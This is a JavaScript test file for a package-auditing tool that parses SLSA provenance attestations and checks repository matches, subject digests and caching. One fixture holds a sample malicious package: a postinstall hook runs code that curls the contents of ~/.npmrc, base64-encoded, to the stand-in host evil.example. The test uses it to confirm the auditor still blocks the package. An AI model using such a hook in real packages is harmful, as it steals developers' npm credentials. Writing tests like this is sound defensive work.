"use strict";

const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const test = require("node:test");

const {
  fetchProvenanceAttestation,
  parseAttestation,
  compareProvenanceToRepository,
  canonicalGithubKey,
  verifySubjectDigest,
  _internal
} = require("../src/attestation");
const { auditEvidence } = require("../src/auditor");

const FIXTURE_DIR = path.join(__dirname, "fixtures");

function loadFixture(name) {
  return JSON.parse(fs.readFileSync(path.join(FIXTURE_DIR, name), "utf8"));
}

// ---- Helpers for synthesising bundles ----

// Encode a JSON object as a base64 DSSE payload string.
function encodePayload(obj) {
  return Buffer.from(JSON.stringify(obj), "utf8").toString("base64");
}

// Build a minimal SLSA v0.2 bundle for parser regression tests. Live npm no
// longer emits v0.2 (everyone moved to v1) but our parser still has to handle
// it because attestations published years ago still live in the registry.
function syntheticSlsaV02Bundle({ repoUrl, ref, sha, workflowPath, builderId, withTlog = true }) {
  const payload = {
    _type: "https://in-toto.io/Statement/v0.1",
    predicateType: "https://slsa.dev/provenance/v0.2",
    subject: [{ name: "pkg:npm/example@1.0.0", digest: { sha512: "deadbeef" } }],
    predicate: {
      buildType: "https://github.com/slsa-framework/slsa-github-generator/generic@v1",
      builder: { id: builderId },
      invocation: {
        configSource: {
          uri: `git+${repoUrl}@${ref}`,
          digest: { sha1: sha },
          entryPoint: workflowPath
        }
      }
    }
  };
  return {
    predicateType: "https://slsa.dev/provenance/v0.2",
    bundle: {
      mediaType: "application/vnd.dev.sigstore.bundle+json;version=0.2",
      verificationMaterial: {
        tlogEntries: withTlog ? [{ logIndex: "1234" }] : []
      },
      dsseEnvelope: {
        payload: encodePayload(payload),
        payloadType: "application/vnd.in-toto+json",
        signatures: [{ sig: "..." }]
      }
    }
  };
}

// ---- Tests ----

test("parses a real SLSA Provenance v1 bundle from @actions/core@1.11.1", () => {
  const raw = loadFixture("attestation-actions-core-1.11.1.json");
  const slsa = raw.attestations.find((a) => a.predicateType === "https://slsa.dev/provenance/v1");
  assert.ok(slsa, "fixture should contain an SLSA provenance attestation");

  const parsed = parseAttestation(slsa);
  assert.ok(parsed, "SLSA bundle should parse");
  assert.equal(parsed.slsaVersion, "v1");
  assert.equal(parsed.repository, "https://github.com/actions/toolkit");
  assert.ok(parsed.ref && parsed.ref.startsWith("refs/"), `unexpected ref: ${parsed.ref}`);
  assert.equal(parsed.workflowPath, ".github/workflows/releases.yml");
  assert.equal(parsed.builderId, "https://github.com/actions/runner/github-hosted");
  assert.equal(parsed.hasTlogEntry, true);
  assert.ok(parsed.subjects.length > 0);
  // Subjects are purls — @ is URL-encoded as %40 (e.g. "pkg:npm/%40actions/core@1.11.1").
  assert.ok(
    parsed.subjects[0].includes("actions/core"),
    `unexpected subject: ${parsed.subjects[0]}`
  );
});

test("npm publish-attestations are ignored (only SLSA provenance counts)", () => {
  const raw = loadFixture("attestation-actions-core-1.11.1.json");
  const publishAtt = raw.attestations.find(
    (a) => a.predicateType === "https://github.com/npm/attestation/tree/main/specs/publish/v0.1"
  );
  assert.ok(publishAtt, "fixture should contain an npm publish attestation");
  assert.equal(parseAttestation(publishAtt), null, "publish attestation should not be reported as provenance");
});

test("parses a SLSA Provenance v0.2 bundle (synthetic fixture)", () => {
  const synthetic = syntheticSlsaV02Bundle({
    repoUrl: "https://github.com/example/widget",
    ref: "refs/tags/v1.0.0",
    sha: "0123456789abcdef0123456789abcdef01234567",
    workflowPath: ".github/workflows/publish.yml",
    builderId: "https://github.com/actions/runner/github-hosted"
  });

  const parsed = parseAttestation(synthetic);
  assert.ok(parsed);
  assert.equal(parsed.slsaVersion, "v0.2");
  assert.equal(parsed.repository, "https://github.com/example/widget");
  assert.equal(parsed.ref, "refs/tags/v1.0.0");
  assert.equal(parsed.commitSha, "0123456789abcdef0123456789abcdef01234567");
  assert.equal(parsed.workflowPath, ".github/workflows/publish.yml");
  assert.equal(parsed.builderId, "https://github.com/actions/runner/github-hosted");
  assert.equal(parsed.hasTlogEntry, true);
});

test("v0.2 parser flags absent tlog entries", () => {
  const synthetic = syntheticSlsaV02Bundle({
    repoUrl: "https://github.com/example/widget",
    ref: "refs/heads/main",
    sha: "abc",
    workflowPath: ".github/workflows/x.yml",
    builderId: "anything",
    withTlog: false
  });
  const parsed = parseAttestation(synthetic);
  assert.ok(parsed);
  assert.equal(parsed.hasTlogEntry, false);
  assert.equal(parsed.tlogEntryCount, 0);
});

test("rejects malformed bundles gracefully", () => {
  assert.equal(parseAttestation(null), null);
  assert.equal(parseAttestation({}), null);
  assert.equal(parseAttestation({ bundle: {} }), null);
  assert.equal(parseAttestation({ bundle: { dsseEnvelope: {} } }), null);
  // wrong predicate
  const wrong = syntheticSlsaV02Bundle({
    repoUrl: "https://github.com/x/y",
    ref: "refs/heads/main",
    sha: "abc",
    workflowPath: ".github/workflows/x.yml",
    builderId: "anything"
  });
  // Swap predicateType in the payload
  const payload = JSON.parse(Buffer.from(wrong.bundle.dsseEnvelope.payload, "base64").toString());
  payload.predicateType = "https://example.com/unknown";
  wrong.bundle.dsseEnvelope.payload = Buffer.from(JSON.stringify(payload)).toString("base64");
  assert.equal(parseAttestation(wrong), null);
});

test("canonicalGithubKey normalises common URL shapes", () => {
  assert.equal(canonicalGithubKey("https://github.com/Foo/Bar"), "foo/bar");
  assert.equal(canonicalGithubKey("git+https://github.com/foo/bar.git"), "foo/bar");
  assert.equal(canonicalGithubKey("https://gitlab.com/foo/bar"), null);
  assert.equal(canonicalGithubKey(null), null);
});

test("compareProvenanceToRepository detects match/mismatch/unknown", () => {
  const provenance = { repository: "https://github.com/actions/toolkit" };

  // match (exact)
  assert.equal(
    compareProvenanceToRepository(provenance, "https://github.com/actions/toolkit"),
    "match"
  );
  // match (case + .git suffix differences)
  assert.equal(
    compareProvenanceToRepository(provenance, "git+https://github.com/Actions/Toolkit.git"),
    "match"
  );
  // match against object form
  assert.equal(
    compareProvenanceToRepository(provenance, { url: "https://github.com/actions/toolkit" }),
    "match"
  );
  // mismatch
  assert.equal(
    compareProvenanceToRepository(provenance, "https://github.com/attacker/lookalike"),
    "mismatch"
  );
  // unknown when one side missing
  assert.equal(compareProvenanceToRepository(provenance, null), "unknown");
  assert.equal(compareProvenanceToRepository(null, "https://github.com/x/y"), "unknown");
});

test("auditor surfaces provenance-attested band when attestation is present and matches package.json", () => {
  const raw = loadFixture("attestation-actions-core-1.11.1.json");
  const slsa = raw.attestations.find((a) => a.predicateType === "https://slsa.dev/provenance/v1");
  const primary = parseAttestation(slsa);

  const report = auditEvidence({
    packageName: "@actions/core",
    npmMetadata: {
      name: "@actions/core",
      version: "1.11.1",
      repository: { url: "https://github.com/actions/toolkit", directory: "packages/core" }
    },
    sourceFiles: {
      "package.json": JSON.stringify({
        name: "@actions/core",
        version: "1.11.1",
        repository: { url: "https://github.com/actions/toolkit" }
      }),
      "lib/core.js": "module.exports = {};"
    },
    provenanceAttestation: {
      attested: true,
      primary,
      all: [primary],
      attestationCount: 2
    }
  });

  const bandNames = report.riskBands.map((b) => b.band);
  assert.ok(
    bandNames.includes("provenance-attested"),
    `expected provenance-attested band, got: ${bandNames.join(", ")}`
  );
  const band = report.riskBands.find((b) => b.band === "provenance-attested");
  assert.equal(band.severity, "info");
  // Verdict should still be safe (or at worst review for unrelated reasons).
  assert.notEqual(report.verdict, "block");
});

test("auditor flags provenance-mismatch HIGH when attestation repo differs from package.json", () => {
  // Fabricate a primary that claims a different repo than what package.json declares.
  const primary = {
    slsaVersion: "v1",
    buildType: "https://slsa-framework.github.io/github-actions-buildtypes/workflow/v1",
    repository: "https://github.com/attacker/lookalike",
    ref: "refs/heads/main",
    commitSha: "deadbeef",
    workflowPath: ".github/workflows/publish.yml",
    builderId: "https://github.com/actions/runner/github-hosted",
    invocationId: null,
    subjects: ["pkg:npm/widget@1.0.0"],
    hasTlogEntry: true,
    tlogEntryCount: 1,
    predicateType: "https://slsa.dev/provenance/v1"
  };

  const report = auditEvidence({
    packageName: "widget",
    npmMetadata: {
      name: "widget",
      version: "1.0.0",
      repository: { url: "https://github.com/legitimate/widget" }
    },
    sourceFiles: {
      "package.json": JSON.stringify({
        name: "widget",
        version: "1.0.0",
        repository: "https://github.com/legitimate/widget"
      }),
      "index.js": "module.exports = {};"
    },
    provenanceAttestation: {
      attested: true,
      primary,
      all: [primary],
      attestationCount: 1
    }
  });

  assert.equal(report.verdict, "block");
  const bandNames = report.riskBands.map((b) => b.band);
  assert.ok(
    bandNames.includes("provenance-mismatch"),
    `expected provenance-mismatch band, got: ${bandNames.join(", ")}`
  );
  // Mismatch should NOT also fire the positive band.
  assert.ok(!bandNames.includes("provenance-attested"));
});

test("auditor is silent when package has no attestation", () => {
  const report = auditEvidence({
    packageName: "lodash",
    npmMetadata: {
      name: "lodash",
      version: "4.17.21",
      repository: { url: "https://github.com/lodash/lodash" }
    },
    sourceFiles: {
      "package.json": JSON.stringify({
        name: "lodash",
        version: "4.17.21",
        repository: "https://github.com/lodash/lodash"
      }),
      "index.js": "module.exports = {};"
    },
    provenanceAttestation: { attested: false, reason: "no-attestation" }
  });

  const bandNames = report.riskBands.map((b) => b.band);
  assert.ok(!bandNames.includes("provenance-attested"));
  assert.ok(!bandNames.includes("provenance-mismatch"));
});

// ---- finding 4: parse-only "verification" hardening ----

test("decodePayload caps an oversized DSSE payload (finding 4a)", () => {
  // Craft an in-toto Statement whose JSON is far larger than the 1MB decoded
  // cap. decodePayload must refuse it (return null) rather than parse a huge
  // untrusted blob.
  const oversized = {
    predicateType: "https://slsa.dev/provenance/v1",
    subject: [{ name: "pkg", digest: { sha512: "x".repeat(2 * 1024 * 1024) } }]
  };
  const envelope = { payload: encodePayload(oversized) };
  assert.equal(_internal.decodePayload(envelope), null);
  // A normal-sized payload still decodes fine.
  const ok = { predicateType: "https://slsa.dev/provenance/v1", subject: [] };
  assert.deepEqual(_internal.decodePayload({ payload: encodePayload(ok) }), ok);
});

test("parseAttestation marks results as NOT cryptographically verified and exposes subject digests (finding 4b)", () => {
  const synthetic = syntheticSlsaV02Bundle({
    repoUrl: "https://github.com/example/widget",
    ref: "refs/tags/v1.0.0",
    sha: "0123456789abcdef0123456789abcdef01234567",
    workflowPath: ".github/workflows/publish.yml",
    builderId: "https://github.com/actions/runner/github-hosted"
  });
  const parsed = parseAttestation(synthetic);
  assert.equal(parsed.cryptographicallyVerified, false, "parse-only result must self-report unverified");
  assert.ok(Array.isArray(parsed.subjectDigests) && parsed.subjectDigests.length === 1);
  assert.equal(parsed.subjectDigests[0].digest.sha512, "deadbeef");
});

test("verifySubjectDigest binds an attestation to the downloaded tarball digest (finding 4b)", () => {
  const synthetic = syntheticSlsaV02Bundle({
    repoUrl: "https://github.com/example/widget",
    ref: "refs/tags/v1.0.0",
    sha: "abc",
    workflowPath: ".github/workflows/x.yml",
    builderId: "anything"
  });
  const parsed = parseAttestation(synthetic);
  // Matching digest (the synthetic subject uses sha512:deadbeef).
  assert.equal(
    verifySubjectDigest(parsed, { algorithm: "sha512", value: "DEADBEEF" }),
    true,
    "case-insensitive digest match should bind"
  );
  // Wrong value → no binding (this is exactly how a tampered artifact would
  // fail to match an otherwise-parseable attestation).
  assert.equal(verifySubjectDigest(parsed, { algorithm: "sha512", value: "0000" }), false);
  // Wrong algorithm → no binding.
  assert.equal(verifySubjectDigest(parsed, { algorithm: "sha256", value: "deadbeef" }), false);
  // Missing digest → no binding.
  assert.equal(verifySubjectDigest(parsed, null), false);
});

test("a bogus UNSIGNED attestation is info-only and never reduces severity (finding 4c)", () => {
  // Forge a parseable-but-unsigned SLSA v0.2 bundle for a package that also
  // has a genuine HIGH-severity risk finding. The attestation must be recorded
  // at severity:info, must NOT appear as a mismatch, and must NOT pull the
  // verdict toward safe — the HIGH finding must still drive a non-safe verdict.
  const forged = syntheticSlsaV02Bundle({
    repoUrl: "https://github.com/legit/widget",
    ref: "refs/heads/main",
    sha: "abc",
    workflowPath: ".github/workflows/publish.yml",
    builderId: "https://github.com/actions/runner/github-hosted",
    withTlog: false // no transparency-log entry at all — definitely unsigned/forged
  });
  const primary = parseAttestation(forged);
  assert.ok(primary);
  assert.equal(primary.cryptographicallyVerified, false);

  // Baseline: audit WITHOUT the attestation to capture the verdict from the
  // risk finding alone.
  const evidenceBase = {
    packageName: "widget",
    npmMetadata: {
      name: "widget",
      version: "1.0.0",
      repository: { url: "https://github.com/legit/widget" }
    },
    sourceFiles: {
      "package.json": JSON.stringify({
        name: "widget",
        version: "1.0.0",
        // An install-time hook that runs code — a real risk finding the
        // auditor flags regardless of provenance.
        scripts: { postinstall: "node index.js" },
        repository: "https://github.com/legit/widget"
      }),
      "index.js":
        "const cp = require('child_process');\n" +
        "cp.exec('curl http://evil.example/$(cat ~/.npmrc | base64)');\n"
    }
  };

  const withoutAtt = auditEvidence({ ...evidenceBase });
  const withAtt = auditEvidence({
    ...evidenceBase,
    provenanceAttestation: { attested: true, primary, all: [primary], attestationCount: 1 }
  });

  const bandNames = withAtt.riskBands.map((b) => b.band);
  // The forged attestation is surfaced only as an info-severity positive band
  // (repo matches package.json → not a mismatch).
  if (bandNames.includes("provenance-attested")) {
    const band = withAtt.riskBands.find((b) => b.band === "provenance-attested");
    assert.equal(band.severity, "info", "provenance must stay severity:info");
  }
  assert.ok(!bandNames.includes("provenance-mismatch"));

  // The core invariant: adding an unsigned attestation must NOT move the
  // verdict toward safe. It must be no safer than the no-attestation baseline.
  const rank = { safe: 0, review: 1, block: 2 };
  assert.ok(
    rank[withAtt.verdict] >= rank[withoutAtt.verdict],
    `unsigned attestation moved verdict toward safe: ${withoutAtt.verdict} -> ${withAtt.verdict}`
  );
  assert.notEqual(withAtt.verdict, "safe", "a package with an install-time exfil hook must not be 'safe' just because it carries a parseable attestation");
});

test("fetchProvenanceAttestation reads/writes the 24h disk cache", async () => {
  const os = require("node:os");
  const fsp = require("node:fs/promises");

  // We can't easily replace the cache dir without changing the API, so just
  // verify caching behaviour using the real cache: write a sentinel, read it.
  const cacheDir = _internal.CACHE_DIR;
  await fsp.mkdir(cacheDir, { recursive: true, mode: 0o700 });
  const key = `${encodeURIComponent("__pkgxray-test__@0.0.0")}.json`;
  const cachePath = path.join(cacheDir, key);
  await fsp.writeFile(cachePath, JSON.stringify({ attested: false, reason: "no-attestation", checkedAt: "2026-01-01T00:00:00Z" }));

  try {
    const result = await fetchProvenanceAttestation("__pkgxray-test__", "0.0.0");
    assert.equal(result.attested, false);
    assert.equal(result.reason, "no-attestation");
    assert.equal(result.fromCache, true);
  } finally {
    await fsp.rm(cachePath, { force: true });
  }
});
